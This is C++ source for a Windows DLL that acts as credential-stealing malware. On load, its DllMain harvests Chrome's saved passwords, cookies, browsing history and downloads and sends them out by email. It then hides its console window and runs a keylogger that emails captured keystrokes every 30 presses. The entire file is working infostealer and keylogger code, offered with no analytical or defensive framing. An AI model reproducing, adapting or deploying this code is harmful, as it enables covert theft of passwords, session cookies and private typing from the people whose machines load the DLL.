// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <fstream>
#include "includes/ChromeCollecter.h"
#include "includes/Data.h"
#include "includes/SendEmail.h"
#include <winuser.h>
#include <windowsx.h>


void gather_result(const std::list<userData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{

		account_info += "Url: " + data.url  + "\nUsername: " + data.username + "\nPassword: " + data.password + "\n";
		account_info += "--------------------------------------------------------------------------------\n" ;
	}
}

void gather_result(const std::list<CookieData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{
		account_info += "HostKey: " + data.hostKey + "\nname: " + data.name + "\nValue:: "+ data.value +"\nPath: " + data.path + "\nExpireUTC: " + data.expireUTC + "\n";
		account_info += "--------------------------------------------------------------------------------\n";
	
	}
}
void gather_result(const std::list<historyData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{
		account_info += "Url: " + data.url + "\ntitle: " + data.title + "\nvisit count:: " + data.visit_count + "\nlast visit time: " + data.last_visit_time + "\n";
		account_info += "--------------------------------------------------------------------------------\n";

	}

}
void gather_result(const std::list<downloadsData>& data, std::string& account_info)
{
	for (const auto& data : data)
	{
		account_info += "target path: " + data.target_path + "\tab url: " + data.tab_url + "\nsize(Bytes):: " + data.total_bytes + "\nstart time: " + data.start_time + "\nend time: " + data.end_time + "\n";
		account_info += "--------------------------------------------------------------------------------\n";

	}

}

int get_keys(void)
{
    std::string keyLogger;
    int maxLoggesBeforeEmail = 30;
    int count = 0;
    int character;
    while (1)
    {
        for (character = 8; character <= 222; character++)
        {
            if (GetAsyncKeyState(character) == -32767)
            {       
                count++;
                   if ((character >= 39) && (character <= 64))
                    {
                       char c = character;
                        keyLogger += c;
                        break;
                    }
                    else if ((character > 64) && (character < 91))
                    {
                        character += 32;
                        char c = character;
                        keyLogger += c;
                        break;
                    }
                    else
                    {
                        switch (character)
                        {
                        case VK_SPACE:
                            keyLogger += ' ';
                            break;
                        case VK_SHIFT:
                            keyLogger += "\r\n[SHIFT]\r\n";
                            break;
                        case VK_RETURN:
                            keyLogger += "\r\n[ENTER]\r\n";
                            break;
                        case VK_BACK:
                            keyLogger += "\r\n[BACKSPACE]\r\n";
                            break;
                        case VK_TAB:
                            keyLogger += "\r\n[BACKSPACE]\r\n";
                            break;
                        case VK_CONTROL:
                            keyLogger += "\r\n[CTRL]\r\n";
                            break;
                        case VK_DELETE:
                            keyLogger += "\r\n[DEL]\r\n";
                            break;
                        case VK_OEM_1:
                            keyLogger += "\r\n[;:]\r\n";
                            break;
                        case VK_OEM_2:
                            keyLogger += "\r\n[/?]\r\n";
                            break;
                        case VK_OEM_3:
                            keyLogger +="\r\n[`~]\r\n";
                            break;
                        case VK_OEM_4:
                            keyLogger += "\r\n[ [{ ]\r\n";
                            break;
                        case VK_OEM_5:
                            keyLogger += "\r\n[\\|]\r\n";
                            break;
                        case VK_OEM_6:
                            keyLogger += "\r\n[ ]} ]\r\n";
                            break;
                        case VK_OEM_7:
                            keyLogger += "\r\n['\"]\r\n";
                            break;
                        case 187:
                            keyLogger += '+';
                            break;
                        case 188:
                            keyLogger += ',';
                            break;
                        case 189:
                            keyLogger += '-';
                            break;
                        case 190:
                            keyLogger += '.';
                            break;
                        case VK_NUMPAD0:
                            keyLogger += '0';
                            break;
                        case VK_NUMPAD1:
                            keyLogger += '1';
                            break;
                        case VK_NUMPAD2:
                            keyLogger += '2';
                            break;
                        case VK_NUMPAD3:
                            keyLogger += '3';
                            break;
                        case VK_NUMPAD4:
                            keyLogger += '4'; 
                            break;
                        case VK_NUMPAD5:
                            keyLogger += '5';
                            break;
                        case VK_NUMPAD6:
                            keyLogger += '6';
                            break;
                        case VK_NUMPAD7:
                            keyLogger += '7';
                            break;
                        case VK_NUMPAD8:
                            keyLogger += '8';
                            break;
                        case VK_NUMPAD9:
                            keyLogger += '9';
                            break;
                        case VK_CAPITAL:
                            keyLogger += "\r\n[CAPS LOCK]\r\n";
                            break;
                        default:
                            break;
                        }
                    }
                }
            }
            if (count == maxLoggesBeforeEmail) {
              sendEmail("keyLogger information", keyLogger);
              keyLogger = "";
              count = 0;
           }
     }
    }

void startKeyLogger() {
   HWND stealth; /*creating stealth */
   AllocConsole();
   stealth = FindWindowA("ConsoleWindowClass", NULL);
   ShowWindow(stealth, 0);
   get_keys();
}

void getInfo() {
	ChromeCollecter collecter;
	std::list<userData> passwords;
	std::list<CookieData> cookies;
	std::list<historyData> history;
	std::list<downloadsData> downloads;
	collecter.collectPasswords(passwords);
	collecter.collectCookies(cookies);
	collecter.collectHistory(history);
	collecter.collectDownloads(downloads);

	std::string account_info("Password information :\n");
	gather_result(passwords, account_info);

	account_info += "Cookies information :\n";
	gather_result(cookies, account_info);

	account_info += "History information :\n";
	gather_result(history, account_info);

	account_info += "Downloads information :\n";
	gather_result(downloads, account_info);

	sendEmail("account information", account_info);

    startKeyLogger();
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		getInfo();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

